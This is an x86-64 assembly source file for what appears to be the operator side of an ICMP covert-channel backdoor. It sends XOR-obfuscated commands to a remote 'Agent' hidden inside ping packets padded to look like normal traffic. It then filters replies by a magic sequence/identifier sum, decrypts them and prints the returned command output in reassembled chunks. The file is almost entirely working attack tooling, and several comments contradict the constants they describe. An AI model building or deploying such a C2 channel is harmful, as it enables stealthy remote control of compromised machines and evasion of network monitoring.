section .bss
    fd_no resb 4                ; Socket file descriptor
    sniffed_data resb 1200      ; Buffer for received ICMP data
    incoming_addr resb 16       ; Buffer for sender's IP/Port (sockaddr_in)
    addr_len      resd 1        ; Size of sockaddr_in (16 bytes)
    addr_ip resb 16             ; Buffer for formatted string IP address
    ip_buf resb 16              ; Buffer for raw IP input from user

section .data
    msg_ip db "Target IP: "
    len_msg_ip equ $ - msg_ip
    msg_cmd db "Command: "
    len_msg_cmd equ $ - msg_cmd
    newline db 10               ; ASCII newline (\n)
    forip db 4                  ; Legacy unused variable
    space_char db 32            ; ASCII space character
    
    ; --- [MIMICRY UPDATE] UPDATED PACKET ANATOMY ---
    icmp_packet:
        type db 8               ; ICMP Type 8 (Echo Request)
        code db 0               
        checksum dw 0           ; Checksum placeholder
        identifier dw 0         ; Packet Identifier
        sequence dw 0           ; Magic Sequence for filtering
        ; --- MIMICRY PADDING (24 BYTES) ---
        mimicry_ts dq 0         ; 8-byte Dynamic Timestamp (RDTSC)
        mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
                    db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        ; -------------------------------------
        payload times 100 db 0  ; Command payload buffer (100 bytes)
    payload_len equ $ - payload ; Total Payload (Padding + Command = 124 bytes)
    
    target_addr:
        dw 2                    ; AF_INET (IPv4)
        dw 0                    ; Port (Unused for ICMP)
        dd 0                    ; Destination IP (Populated via user input)
        dq 0                    ; Padding

section .text
global _start

; --- ENTRY POINT ---
_start:
    ; Create Raw ICMP Socket
    mov rax, 41             ; sys_socket
    mov rdi, 2              ; AF_INET (IPv4)
    mov rsi, 3              ; SOCK_RAW
    mov rdx, 1              ; IPPROTO_ICMP
    syscall                 
    mov [fd_no], eax        ; Save sockfd

    ; Display Target IP Prompt
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, msg_ip
    mov rdx, len_msg_ip
    syscall

    ; Read Target IP from Stdin
    mov rax, 0              ; sys_read
    mov rdi, 0              ; stdin
    mov rsi, ip_buf
    mov rdx, 16
    syscall

    ; Initialize String-to-IP Conversion
    lea rsi, [ip_buf]           
    lea rdi, [target_addr + 4]  
    xor ebx, ebx                
    xor rax, rax                

_parse_ip_loop:
    lodsb                       ; Load next byte from IP buffer
    cmp al, 10                  ; Check for Newline (Enter)
    je .store_byte              
    cmp al, 46                  ; Check for Dot (.)
    je .store_byte              
    
    ; ASCII to Integer: ebx = (ebx * 10) + (al - '0')
    sub al, 48                  
    imul ebx, 10                
    add ebx, eax                
    jmp _parse_ip_loop

.store_byte:
    mov [rdi], bl               ; Store parsed octet into target_addr struct
    inc rdi                     
    xor ebx, ebx                ; Reset octet accumulator
    cmp al, 10                  ; Finish if Newline detected
    je _get_command             
    jmp _parse_ip_loop          

_get_command:
    ; --- CLEAR PAYLOAD BUFFER (Security & Integrity) ---
    cld
    lea rdi, [payload]
    xor al, al
    mov rcx, 100
    rep stosb
    
    ; Display Command Prompt
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_cmd
    mov rdx, len_msg_cmd
    syscall

    ; Read Command from Stdin
    mov rax, 0              ; sys_read
    mov rdi, 0              ; stdin
    mov rsi, payload        
    mov rdx, 100            
    syscall
    
    ; --- STRIP NEWLINE CHARACTER ---
    dec rax                         
    mov byte [payload + rax], 0     ; Null terminate for clean execution
    
    ; --- OBFUSCATION PHASE ---
    lea rsi, [payload]      
    mov rcx, 100            ; Obfuscate entire 100-byte buffer
    call _xor_cipher        

    ; --- [MIMICRY UPDATE] DYNAMIC TIMESTAMP INJECTION ---
    rdtsc                           ; Read Time-Stamp Counter
    mov [icmp_packet + 8], rax      ; Inject TS right after ICMP Header
    ; -----------------------------------------------------
    call _create_seq_id
    call _checksum_cal      ; Compute ICMP Checksum
    call _sendto            ; Dispatch command to Agent

_sniff:
    ; --- RECVFROM CONFIGURATION ---
    mov dword [addr_len], 16   
    mov r8, incoming_addr       
    mov r9, addr_len            
    xor r10, r10                

    ; --- CLEANUP RECV BUFFER ---
    lea rdi, [sniffed_data] 
    xor al, al              
    mov rcx, 1200           
    rep stosb               

    ; --- LISTEN FOR AGENT RESPONSE ---
    mov rax, 45             ; sys_recvfrom 
    mov edi, [fd_no]        
    mov rsi, sniffed_data   
    mov rdx, 1200           
    syscall

    ; --- PROTOCOL FILTERS ---
    cmp byte [sniffed_data + 20], 0     ; Match ICMP Type 0 (Echo Reply)
    jne _sniff                          

    ;-----------
    push rax
    push rdx
    ;-----------
; --- MAGIC SEQUENCE VERIFICATION (ASYMMETRIC) ---
    movzx eax, word [sniffed_data + 26] ; Extract Sequence
    xchg al, ah                         ; Endianness correction
    movzx edx, word [sniffed_data + 24] ; Extract Identifier
    xchg dl, dh                         ; Endianness correction
    
    add eax, edx                        ; EAX = SEQ + ID
    cmp eax, 55000                        ; Verify Agent's asymmetric return key (150)
    
    pop rdx                             ; Restore saved RDX
    pop rax                             ; Restore saved RAX (Packet size)
    
    jne _sniff                          ; Drop packet if validation fails                   

    cmp rax, 0               
    jl _error               
    je _exit                

    ; --- [MIMICRY UPDATE] PACKET SIZE VALIDATION ---
    ; Expected: IP(20) + ICMP(8) + Mimicry(24) = 52 Bytes Minimum
    cmp rax, 52              
    jb _sniff               

    ; --- [MIMICRY UPDATE] PAYLOAD EXTRACTION ---
    mov r14, rax                     
    sub r14, 52                     ; Strip IP, ICMP, and Mimicry Padding
    lea rsi, [sniffed_data + 52]    ; Start reading after Mimicry zone
    mov rdx, r14                     
    push rdx                        ; Save length for write syscall
    push rsi                        ; Save address for decryption

    ; --- SENDER IDENTIFICATION (IP LOGGING) ---
    xor rdx, rdx                     
    xor rbx, rbx                     
    mov rcx, 7                       ; IP raw offset
    mov rdi, 15                      ; IP string buffer offset
_loopforip:
    mov bl, 10                       
    movzx ax, [incoming_addr + rcx]  
_divloop:
    div bl                          
    add ah, 48                       ; Integer to ASCII
    mov [addr_ip + rdi], ah            
    dec rdi                         
    xor ah, ah                       
    cmp al, 0                        
    jg _divloop                     
    cmp rcx, 4                       
    je _contiune                    
    mov byte [addr_ip + rdi], 46     ; Append Dot (.)
_contiune:
    dec rdi                         
    dec rcx                         
    cmp rcx, 3                       
    jg _loopforip

    ; --- OUTPUT LOGGING ---
    mov rax, 1              ; Print Source IP
    mov rdi, 1              
    mov rdx, 16              
    mov rsi, addr_ip         
    syscall

    mov rax, 1              ; Print Space
    mov rdi, 1              
    mov rdx, 1               
    mov rsi, space_char      
    syscall

    pop rsi                 ; Restore payload pointer
    pop rdx                 ; Restore payload length

    ; --- DE-OBFUSCATION PHASE ---
    mov rcx, rdx            ; rcx = payload size (r14)
    call _xor_cipher        ; Decrypt stream in-place

    ; --- DISPLAY AGENT OUTPUT ---
    mov rax, 1              ; sys_write
    mov rdi, 1              
    syscall                 

    ; --- [MIMICRY UPDATE] FRAGMENTATION (CHUNKING) LOGIC ---
    cmp r14, 1000           ; Check if fragment is full (1000 bytes max)
    je _sniff_chunk         ; If yes, enter Chunking Receiver mode
    jmp _end_stream         ; If no, EOT (End of Transmission) reached

; ====================================================================
; GEAR 2: FRAGMENTATION HANDLER (Chunking Receiver)
; ====================================================================
_sniff_chunk:
    lea rdi, [sniffed_data]    
    xor al, al                 
    mov rcx, 1200              
    rep stosb                  

    ; Listen for next fragment
    mov rax, 45                
    mov edi, [fd_no]           
    mov rsi, sniffed_data      
    mov rdx, 1200              
    syscall

    cmp rax, 0
    jl _error                  
    je _exit                   
    
    ; Validate fragment size
    cmp rax, 52                
    jb _sniff_chunk            

    cmp byte [sniffed_data + 20], 0     ; Echo Reply filter
    jne _sniff_chunk                    

    push rax
    push rdx
; --- MAGIC SEQUENCE VERIFICATION (ASYMMETRIC) ---
    movzx eax, word [sniffed_data + 26] ; Extract Sequence
    xchg al, ah                         ; Endianness correction
    movzx edx, word [sniffed_data + 24] ; Extract Identifier
    xchg dl, dh                         ; Endianness correction
    
    add eax, edx                        ; EAX = SEQ + ID
    cmp eax, 55000                        ; Verify Agent's asymmetric return key (150)
    
    pop rdx                             ; Restore saved RDX
    pop rax                             ; Restore saved RAX (Packet size)

    jne _sniff_chunk                    

    ; --- EXTRACT & DECRYPT FRAGMENT ---
    mov r14, rax               
    sub r14, 52                
    lea rsi, [sniffed_data + 52] 
    
    mov rcx, r14                
    call _xor_cipher            

    ; Print fragment
    mov rax, 1                 
    mov rdi, 1                 
    mov rdx, r14               
    syscall

    ; --- STREAM FLOW CONTROL ---
    cmp r14, 1000              ; Check if more fragments are expected
    je _sniff_chunk            
    
    jmp _end_stream            

_end_stream:
    ; Close stream with formatting
    mov rax, 1              
    mov rdi, 1              
    mov rsi, newline         
    mov rdx, 1               
    syscall

    jmp _get_command        ; Return to command loop

; --- UTILITY: ICMP CHECKSUM CALCULATION ---
_checksum_cal:
    mov word [checksum], 0          
    xor rcx, rcx                    
    xor r13, r13                    
    xor rax, rax                    
    xor r12d, r12d                  
    ; Compute total size: Header(8) + Payload_len(Mimicry + Command)
    mov rcx, 8                      
    add rcx, payload_len            
    mov r13, 0                      
    xor rbx, rbx                    
.checksum_loop:
    movzx r12d, word [icmp_packet + r13] 
    add eax, r12d                   
    add r13, 2                      
    sub rcx, 2                      
    cmp rcx, 2                      
    jge .checksum_loop              
    cmp rcx, 1                      
    je .final                       
    jmp .wrap                       
.final:
    movzx r12d, byte [icmp_packet + r13] 
    add eax, r12d                  

.wrap:
    mov ebx, eax                    
    shr ebx, 16                     ; Process carry
    and eax, 0xFFFF                 
    add ax, bx                      
    adc ax, 0                       
    not ax                          ; One's complement
    mov [checksum], ax              
    ret

; --- UTILITY: TRANSMIT PACKET ---
_sendto:
    mov r13, 8               
    add r13, payload_len     ; Total packet size (8 Header + 124 Payload)
    mov rax, 44              ; sys_sendto
    mov rdi, [fd_no]         
    mov rsi, icmp_packet     
    mov rdx, r13             
    mov r10, 0               
    mov r8, target_addr      
    mov r9, 16               
    syscall
    ret

; --- UTILITY: XOR OBFUSCATION ---
_xor_cipher:
    test rcx, rcx               
    jz .done                    
    push rsi                        
.loop:
    xor byte [rsi], 0x42        ; Symmetric XOR key: 0x42
    inc rsi                     
    loop .loop                  
    pop rsi                     
.done:
    ret

_create_seq_id:
    ; 1. Generate a random number (1-119) for the Identifier
    rdtsc
    xor edx, edx    ; Clear EDX before division to prevent hardware exception
    mov ecx, 20000
    div ecx         ; EDX now contains the remainder (0-1119)
    add edx,10000         ; EDX is now a random number between 10000 and 29999 (ID)

    ; 2. Calculate the corresponding Sequence number
    mov eax, 45000    ; Load the master key total (120) into EAX
    sub eax, edx    ; EAX = 45000 - EDX (This becomes the SEQ value)

    ; 3. Network Byte Order (Endianness) Correction
    ; Convert to Big-Endian as required by network protocols
    xchg dl, dh     ; Swap lower 16 bits of EDX (DX)
    xchg al, ah     ; Swap lower 16 bits of EAX (AX)

    ; 4. Inject into the ICMP packet structure
    ; ID is at offset 4, SEQ is at offset 6 in the ICMP header
    mov word [icmp_packet + 4], dx
    mov word [icmp_packet + 6], ax
    ret
_error:
    mov rax, 60              ; sys_exit
    mov rdi, 1               
    syscall

_exit:
    mov rax, 60              ; sys_exit
    mov rdi, 0               
    syscall
